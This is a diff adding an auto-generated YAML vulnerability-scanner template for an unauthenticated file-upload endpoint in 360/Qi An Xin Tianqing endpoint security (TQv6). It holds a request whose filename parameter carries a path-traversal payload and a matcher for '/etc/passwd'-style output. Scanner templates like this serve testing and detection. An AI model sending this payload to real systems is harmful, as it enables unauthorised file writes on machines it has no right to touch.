@@ -1,0 +1,26 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-tqv6-unauth_client_upload_file_uploadfile
+info:
+  name: "TQv6 unauth_client_upload_file_uploadfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, tqv6, ref-poc, uploadfile]
+  description: "由参考项目脚本静态导入：TQv6/unauth_client_upload_file_uploadfile（类型 UPLOADFILE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/aaaaa.LUAC"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "<title>360天擎终端安全管理系统"
+          - "<title>360新天擎"
+          - "<title>奇安信新天擎"
+          - "<title>360天擎"
+          - "root:x"
